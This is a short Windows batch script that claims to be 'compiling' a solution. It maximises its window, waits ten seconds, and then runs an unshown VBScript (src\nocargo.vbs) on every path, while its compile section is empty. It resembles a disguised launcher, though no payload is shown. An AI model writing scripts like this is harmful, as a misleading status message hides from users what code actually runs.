@echo off
@echo off
powershell -Command "& { $hwnd = Get-Process -id $PID | ForEach-Object { $_.MainWindowHandle }; if ($hwnd) { Add-Type -Name Win32 -Namespace Win32Functions -MemberDefinition ' [DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); ' -PassThru | ForEach-Object { $_::ShowWindow($hwnd, 3) } } }"
echo Compiling sln object...
timeout /t 10 > null
if exist C:\Cargo (
   goto compile
) else (
   goto nocargo
)
:compile



:nocargo
start /MAX /WAIT src\nocargo.vbs
exit